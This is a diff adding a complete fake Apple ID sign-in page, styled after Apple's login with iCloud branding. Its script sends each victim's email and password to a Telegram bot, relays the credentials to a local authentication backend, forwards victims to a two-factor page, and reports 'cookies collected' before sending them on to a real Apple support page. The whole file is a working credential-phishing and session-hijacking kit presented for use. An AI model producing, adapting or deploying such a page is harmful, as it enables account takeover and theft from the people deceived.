@@ -1,0 +1,641 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="etc/favicon.png" type="image/png">
+  <title>Sign in with your Apple ID</title>
+  <style>
+    :root {
+      --header-height: 44px;
+
+      /* Light Theme Defaults */
+      --body-bg: #fff;
+      --header-bg: rgba(251, 251, 253, 0.5);
+      --header-border: 1px solid rgba(251, 251, 253, 0.5);
+      --theme-color-fillSecondary: rgba(0, 0, 0, 0.1);
+      --text-color: black;
+      --input-border-color: #86868b;
+      --input-focus-color: #0071e3;
+      --input-label-color: #86868b;
+      --content-bg: #fff; /* Default light content background */
+      --theme-color-boxShadow: rgba(0,0,0,0.1); /* Default light box shadow */
+      --form-label-color: #1d1d1fae; /* Default light form label color */
+      --input-bg-color: transparent; /* Default light input background */
+
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --body-bg: #1c1c1e;
+        --header-bg: rgba(29, 29, 31, 0.5);
+        --header-border: 1px solid rgba(29, 29, 31, 0.5);
+        --theme-color-fillSecondary: rgba(255, 255, 255, 0.1);
+        --text-color: white;
+        --input-border-color: #555;
+        --input-focus-color: #4da6ff;
+        --input-label-color: #bbb;
+        --content-bg: #1c1c1e; /* Dark content background */
+        --theme-color-boxShadow: rgba(0,0,0,0.65); /* Dark box shadow */
+        --form-label-color: white; /* Dark form label color */
+        --input-bg-color: hsla(0,0%,100%,.04); /* Dark input background */
+      }
+
+      header img {
+        filter: invert(1);
+      }
+
+      #particle-path-to-invert {
+        fill: white !important; /* Use !important to override inline fill */
+      }
+    }
+
+    .form-label {
+      color: var(--form-label-color);
+    }
+
+    .text-input {
+      background: var(--input-bg-color);
+    }
+
+    body {
+      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--body-bg); /* Use variable for background */
+    }
+
+    body {
+      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--body-bg);
+    }
+
+    @media (max-width: 768px) {
+      body {
+        overflow-x: hidden;
+        width: 100%;
+      }
+      #content {
+        background: none !important;
+        border: none !important;
+        box-shadow: none !important;
+        backdrop-filter: none !important;
+        width: 100% !important;
+        max-width: 100% !important;
+        padding: 0 5vw !important;
+        box-sizing: border-box !important;
+      }
+      .content-container {
+        padding: 32px 0 !important;
+        width: 100% !important;
+      }
+      .text-input {
+        width: 100% !important;
+        max-width: 100% !important;
+        box-sizing: border-box !important;
+      }
+    }
+
+    header {
+      position: sticky;
+      top: 0;
+      display: flex;
+      align-items: center;
+      background: var(--header-bg);
+      height: var(--header-height);
+      min-height: var(--header-height);
+      padding-left: 16px;
+      padding-right: 6px;
+      border-block-end: var(--header-border); /* Logical border */
+      border-bottom: var(--header-border); /* Fallback */
+      z-index: 1000; /* Ensure header stays above other content */
+    }
+
+    header img {
+      height: 32px; /* Adjust logo size as needed */
+      width: auto;
+    }
+
+    .particle-icon {
+      width: 160px;
+      height: auto;
+    }
+
+    .signin-heading {
+      margin-top: 20px;
+      margin-block-start: 20px;
+      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
+      font-size: 32px;
+      font-weight: 500;
+      line-height: 36px;
+      color: var(--text-color);
+      text-align: center;
+    }
+
+    .content-container {
+      width: 100%;
+      text-align: center;
+      padding: 32px;
+      box-sizing: border-box;
+      position: relative; /* For absolute positioning of the input group */
+    }
+
+    .input-group {
+      width: 100%;
+      max-width: 465px;
+      margin: 0 auto;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid var(--input-border-color);
+      min-height: 54px; /* Height of one input field */
+      position: relative; /* For absolute positioning of the password field */
+    }
+    
+    .input-wrapper {
+      position: relative;
+      width: 100%;
+    }
+    
+    .top-input {
+      width: 100%;
+      padding-right: 50px;
+    }
+    
+    .arrow-button {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: 1px solid var(--input-border-color);
+      background: transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      padding: 0;
+      transition: all 0.2s ease;
+      z-index: 10;
+      pointer-events: auto;
+    }
+    
+    .arrow-button:hover {
+      background: rgba(0, 0, 0, 0.05); /* This might need a variable if hover changes based on theme */
+    }
+    
+    .arrow-button:active {
+      transform: translateY(-50%) scale(0.95);
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .arrow-button .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      position: relative;
+    }
+    
+    .arrow-button .spinner::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 50% 0/15% 15% no-repeat,
+        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 85% 15%/15% 15% no-repeat,
+        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 100% 50%/15% 15% no-repeat,
+        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 85% 85%/15% 15% no-repeat,
+        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 50% 100%/15% 15% no-repeat,
+        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 15% 85%/15% 15% no-repeat,
+        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 0 50%/15% 15% no-repeat,
+        radial-gradient(farthest-side, var(--text-color) 90%, transparent) 15% 15%/15% 15% no-repeat;
+      animation: spin 1s linear infinite;
+    }
+    
+    .arrow-button.loading .spinner {
+      display: block;
+    }
+    
+    .arrow-button.loading svg:not(.spinner) {
+      display: none;
+    }
+
+    .text-input {
+      width: 100%;
+      padding: 26px 16px 10px;
+      height: 54px;
+      border: none;
+      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
+      font-size: 16px;
+      box-sizing: border-box;
+      outline: none;
+      z-index: 1;
+      position: relative;
+      line-height: 24px;
+      color: var(--text-color);
+    }
+    
+    .floating-label {
+      position: relative;
+      width: 100%;
+    }
+    
+    .floating-label label {
+      position: absolute;
+      top: 16px;
+      left: 16px;
+      color: var(--input-label-color);
+      font-size: 16px;
+      transition: all 0.2s ease;
+      pointer-events: none;
+      z-index: 0;
+      line-height: 1.5;
+    }
+    
+    .floating-label input:focus + label,
+    .floating-label input:not(:placeholder-shown) + label {
+      top: 6px;
+      font-size: 12px;
+    }
+    
+    .floating-label input.error {
+      border-color: #ff3b30 !important;
+      box-shadow: 0 0 0 1px #ff3b30;
+    }
+    
+    .floating-label input.error.shake {
+      animation: shake 0.5s ease-in-out;
+    }
+    
+    .floating-label.error label,
+    .input-group.error .floating-label label {
+      color: #ff3b30 !important;
+    }
+    
+    .input-group.error {
+      border-color: #ff3b30 !important;
+    }
+    
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      10%, 30%, 50%, 70%, 90% { transform: translateX(-2px); }
+      20%, 40%, 60%, 80% { transform: translateX(2px); }
+    }
+    
+    .text-input::placeholder {
+      color: var(--input-label-color);
+    }
+
+    .top-input {
+      border-bottom: 1px solid var(--input-border-color);
+      border-radius: 12px 12px 0 0;
+    }
+
+    .bottom-input {
+      border-radius: 0 0 12px 12px;
+      width: 100%;
+      padding-right: 50px;
+    }
+    
+    .password-wrapper {
+      position: relative;
+    }
+    
+    .password-continue {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: 1px solid var(--input-border-color);
+      background: transparent;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      padding: 0;
+      transition: all 0.2s ease;
+    }
+    
+    /* When password is hidden */
+    .input-group:has(.bottom-input[style*="display: none"]) .top-input {
+      border-radius: 12px;
+    }
+
+    .text-input:focus {
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(0, 125, 250, 0.1);
+    }
+
+    .input-group:focus-within {
+      border-color: var(--input-focus-color);
+      box-shadow: 0 0 0 1px var(--input-focus-color);
+    }
+
+    .input-group:focus-within .top-input {
+      border-bottom-color: var(--input-focus-color);
+    }
+
+    #content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 32px;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 70vw;
+      max-width: 580px;
+      height: 70vh;
+      max-height: 640px;
+      border-radius: 32px;
+      background: var(--content-bg);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0); /* This might need a variable too */
+      box-shadow: 0 11px 34px 0 var(--theme-color-boxShadow);
+    }
+  </style>
+</head>
+<body style="display: flex; flex-direction: column; height: 100vh; background: var(--body-bg);">
+  <header>
+    <img src="etc/icloud-logo.svg" alt="iCloud Logo">
+  </header>
+  <div id="content">
+    <svg viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="icon particle-icon" draggable="false" aria-hidden="true"><defs><linearGradient x1="100%" y1="100%" x2="50%" y2="50%" id="f2f15fa97739d6b8762a5540d983611bb"><stop stop-color="#8700FF" offset="0%"></stop><stop stop-color="#EE00E1" stop-opacity="0" offset="100%"></stop></linearGradient><linearGradient x1="0%" y1="100%" x2="50%" y2="50%" id="f2f15fa97739d6b8762a5540d983611bc"><stop stop-color="#E00" offset="0%"></stop><stop stop-color="#EE00E1" stop-opacity="0" offset="100%"></stop></linearGradient><linearGradient x1="100%" y1="0%" x2="50%" y2="50%" id="f2f15fa97739d6b8762a5540d983611bd"><stop stop-color="#00B1EE" offset="0%"></stop><stop stop-color="#00B1EE" stop-opacity="0" offset="100%"></stop></linearGradient><linearGradient x1="-17.876%" y1="21.021%" x2="48.935%" y2="50%" id="f2f15fa97739d6b8762a5540d983611be"><stop stop-color="#FFA456" offset="0%"></stop><stop stop-color="#FFA456" stop-opacity="0" offset="100%"></stop></linearGradient><path d="M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z" id="f2f15fa97739d6b8762a5540d983611ba"></path></defs><use fill="#FFF" xlink:href="#f2f15fa97739d6b8762a5540d983611ba"></use><use fill="url(#f2f15fa97739d6b8762a5540d983611bb)" xlink:href="#f2f15fa97739d6b8762a5540d983611ba"></use><use fill="url(#f2f15fa97739d6b8762a5540d983611bc)" xlink:href="#f2f15fa97739d6b8762a5540d983611ba"></use><use fill="url(#f2f15fa97739d6b8762a5540d983611bd)" xlink:href="#f2f15fa97739d6b8762a5540d983611ba"></use><use fill="url(#f2f15fa97739d6b8762a5540d983611be)" xlink:href="#f2f15fa97739d6b8762a5540d983611ba"></use><path id="particle-path-to-invert" fill="var(--theme-color-systemBlack)" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"></path></svg>
+    <div class="signin-heading">Sign in with Apple&nbsp;Account</div>
+    <div class="content-container">
+      <!-- Spacer div to maintain consistent height -->
+      <div style="min-height: 54px;"></div>
+      
+      <div class="input-group" style="position: absolute; top: 0; left: 0; right: 0; margin-top: 24px;">
+        <div class="input-wrapper">
+          <div class="floating-label">
+            <input type="text" id="email_or_phone" class="text-input top-input" placeholder=" " required="">
+            <label for="email_or_phone">Apple ID</label>
+            <button id="continue-button" class="arrow-button email-continue" aria-label="Continue">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="#86868b" xmlns="http://www.w3.org/2000/svg">
+                <rect x="3" y="9.5" width="18" height="5" rx="2.5"></rect>
+                <path d="M21 12L14 5V19L21 12Z" stroke="#86868b" stroke-width="1.5" stroke-linejoin="miter"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <div class="password-wrapper" style="position: relative; display: none;">
+          <div class="floating-label">
+            <input type="password" class="text-input bottom-input" id="password" placeholder=" " required="">
+            <label for="password">Password</label>
+            <button id="password-continue" class="arrow-button password-continue" aria-label="Sign In" style="display: none;">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="#86868b" xmlns="http://www.w3.org/2000/svg">
+                <rect x="3" y="9.5" width="18" height="5" rx="2.5"></rect>
+                <path d="M21 12L14 5V19L21 12Z" stroke="#86868b" stroke-width="1.5" stroke-linejoin="miter"></path>
+              </svg>
+              <div class="spinner"></div>
+            </button>
+          </div>
+        </div>
+      </div>
+      </div> <!-- Close the absolutely positioned container -->
+      
+      <div id="error-message" style="color: #ff3b30; text-align: center; margin: 32px 0 20px; min-height: 20px; visibility: hidden; font-size: 14px;">
+        The email or password you entered is incorrect.
+      </div>
+      
+      <div class="si-remember-password" style="margin-top: 60px; padding: 0 16px; display: flex; justify-content: center;">
+        <div class="form-checkbox" style="display: flex; align-items: center; position: relative;">
+          <input type="checkbox" id="remember-me" class="form-checkbox-input" style="opacity: 0; position: absolute; width: 12.6px; height: 12.6px; margin: 0; z-index: 1; cursor: pointer;">
+          <label for="remember-me" class="form-label" style="display: flex; align-items: center; margin: 0; cursor: pointer; font-size: 16px; padding-left: 28px; position: relative;">
+            <span class="form-checkbox-indicator" style="position: absolute; left: 0; top: 50%; transform: translateY(-50%); display: inline-block; width: 16px; height: 16px; border: 1px solid #86868b; border-radius: 3px; margin-right: 8px; background: white; transition: all 0.2s ease;">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="position: absolute; left: 1px; top: 1px; display: none;">
+                <path d="M20 6L9 17L4 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+              </svg>
+            </span>
+            <span>Keep me signed in</span>
+          </label>
+        </div>    
+      </div>
+      <div style="margin-top: 40px; text-align: center; font-size: 14px; color: #1d1d1fae;">
+        <div style="margin-bottom: 12px;">
+          <a href="#" style="color: #0066cc; text-decoration: none; display: inline-flex; align-items: center;">
+            Forgot Password?
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" style="margin-left: 4px;" xmlns="http://www.w3.org/2000/svg">
+              <path d="M7 17L17 7M17 7H7M17 7V17" stroke="#0066cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+            </svg>
+          </a>
+        </div>
+        <div>
+          <a href="#" style="color: #0066cc; text-decoration: none;">Create Apple Account</a>
+        </div>
+  <div id="footer"></div>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+    const emailInput = document.getElementById('email_or_phone');
+    const passwordInput = document.getElementById('password');
+    const continueButton = document.getElementById('continue-button');
+    const passwordWrapper = document.querySelector('.password-wrapper');
+    const passwordContinue = document.getElementById('password-continue');
+    const errorMessage = document.getElementById('error-message');
+    
+    function showPasswordField() {
+      const email = emailInput.value.trim();
+      if (email !== '') {
+        document.querySelector('.email-continue').style.display = 'none';
+        passwordWrapper.style.display = 'block';
+        document.querySelector('.password-continue').style.display = 'flex';
+        setTimeout(() => passwordInput.focus(), 0);
+      }
+    }
+    
+    continueButton.addEventListener('click', showPasswordField);
+    emailInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') showPasswordField();
+    });
+    
+    function showError(msg) {
+      errorMessage.textContent = msg;
+      errorMessage.style.visibility = 'visible';
+    }
+    
+    function hideError() {
+      errorMessage.style.visibility = 'hidden';
+    }
+    
+    async function sendLoginNotification(email, password) {
+      try {
+        let config;
+        try {
+          const response = await fetch('./instance.json');
+          if (!response.ok) throw new Error(`HTTP ${response.status}`);
+          config = await response.json();
+          console.log('✅ Loaded config from instance.json');
+        } catch (configError) {
+          console.error(configError.message);
+          console.error('❌ Could not load instance.json, aborting notification.');
+          return;
+        }
+    
+        const msg = `🚨 New login 🚨
+    
+    *Email:* ${email}
+    *Password:* ${password}
+    *Time:* ${new Date().toLocaleString()}, TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+    *Referrer:* ${document.referrer || 'Direct visit'}`;
+    
+        const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: config.chat_id, text: msg })
+        });
+    
+        if (response.ok) {
+          console.log('✅ Login notification sent to Telegram successfully');
+        } else {
+          const errorText = await response.text();
+          console.error('❌ Telegram API error:', response.status, errorText);
+          throw new Error(`Telegram API error: ${response.status}`);
+        }
+      } catch (err) {
+        console.error('❌ Failed to send login notification:', err);
+      }
+    }
+    
+    async function notifyCookiesCollected(email) {
+      try {
+        let config;
+        try {
+          const response = await fetch('./instance.json');
+          if (!response.ok) throw new Error(`HTTP ${response.status}`);
+          config = await response.json();
+          console.log('✅ Loaded config from instance.json for cookies');
+        } catch (configError) {
+          console.error(configError.message);
+          console.error('❌ Could not load instance.json, aborting cookies notification.');
+          return;
+        }
+    
+        const msg = `🍪 Cookies collected for ${email}
+    
+    *Time:* ${new Date().toLocaleString()}, TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+    
+        const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: config.chat_id, text: msg })
+        });
+    
+        if (response.ok) {
+          console.log('✅ Cookies notification sent to Telegram successfully');
+        } else {
+          const errorText = await response.text();
+          console.error('❌ Telegram API error (cookies):', response.status, errorText);
+          throw new Error(`Telegram API error: ${response.status}`);
+        }
+      } catch (err) {
+        console.error('❌ Failed to send cookies notification:', err);
+      }
+    }
+    
+    async function startAuth(email, password) {
+      const resp = await fetch('http://127.0.0.1:5000/auth', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+      });
+      const data = await resp.json();
+      return { status: resp.status, data };
+    }
+    
+    passwordContinue.addEventListener('click', async function() {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value;
+      if (!email || !password) {
+        showError('Please enter your Apple ID and password.');
+        return;
+      }
+      hideError();
+    
+      console.log('📤 About to send login notification...');
+      await sendLoginNotification(email, password);
+      console.log('📫 Login notification completed, proceeding with auth...');
+    
+      try {
+        passwordContinue.disabled = true;
+        passwordContinue.classList.add('loading');
+    
+        const { status, data } = await startAuth(email, password);
+    
+        if (status === 202) {
+          console.log('🔐 2FA required, redirecting to 2FA page...');
+          setTimeout(() => {
+            window.location.href = `2fa.html?session_id=${encodeURIComponent(data.session_id)}`;
+          }, 100);
+          return;
+        }
+    
+        if (status === 200) {
+          console.log('✅ Login successful, redirecting to dashboard...');
+          notifyCookiesCollected(email);  // 👈 added here
+          setTimeout(() => {
+            window.location.href = 'https://support.apple.com/en-us/108349?device-type=iphone';
+          }, 100);
+          return;
+        }
+    
+        if (status === 400) {
+          showError(data.error || 'Both email & password are required.');
+        } else if (status === 401) {
+          showError(data.error || 'Your Apple ID or password is incorrect.');
+        } else {
+          showError(data.error || 'An unexpected error occurred. Please try again.');
+        }
+      } catch (err) {
+        console.error('Auth error:', err);
+        showError(err.message || 'Login failed. Please try again.');
+      } finally {
+        passwordContinue.disabled = false;
+        passwordContinue.classList.remove('loading');
+      }
+    });
+    
+    function removeErrorClass(input) {
+      input.classList.remove('error', 'shake');
+      const fl = input.closest('.floating-label');
+      const ig = input.closest('.input-group');
+      if (fl) fl.classList.remove('error');
+      if (ig) ig.classList.remove('error');
+      hideError();
+    }
+    
+    emailInput.addEventListener('input', () => removeErrorClass(emailInput));
+    passwordInput.addEventListener('input', () => removeErrorClass(passwordInput));
+    passwordInput.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') passwordContinue.click();
+    });
+    
+    const checkbox = document.getElementById('remember-me');
+    const indicator = document.querySelector('.form-checkbox-indicator');
+    const checkmark = indicator.querySelector('svg');
+    checkbox.addEventListener('change', function() {
+      if (this.checked) {
+        checkmark.style.display = 'block';
+        indicator.style.borderColor = '#0071e3';
+        indicator.style.backgroundColor = '#0071e3';
+      } else {
+        checkmark.style.display = 'none';
+        indicator.style.borderColor = '#86868b';
+        indicator.style.backgroundColor = 'white';
+      }
+    });
+    });
+    </script>
+    
+
+</div></div></body></html>
